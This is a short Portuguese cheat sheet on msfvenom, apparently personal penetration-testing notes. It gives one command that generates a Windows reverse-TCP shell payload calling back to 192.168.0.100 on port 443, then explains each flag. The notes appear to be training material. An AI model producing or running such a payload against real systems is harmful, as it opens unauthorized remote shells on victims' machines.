# MSFVENOM

O msfvenom é utilizado para criação de exploit.

Criando um exploit para Windows:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.100 LPORT=443 -b "\x00\x0a\x0d\x20" EXITFUNC=thread -f python
```
windows/shell_reverser_tcp ==> Tipo do exploit.
LHOST ==> IP de conexão reversa.
LPORT ==> Porta de conexão reversa.
-b "\x00\x0a\x0d\x20" ==> Bad caracteres ou caracteres inválidos.
-f python ==> Linguagem que vai ser gerado o exploit.
EXITFUNC=thread ==> Evita que a aplicação morra depois do exploit ser fechado.
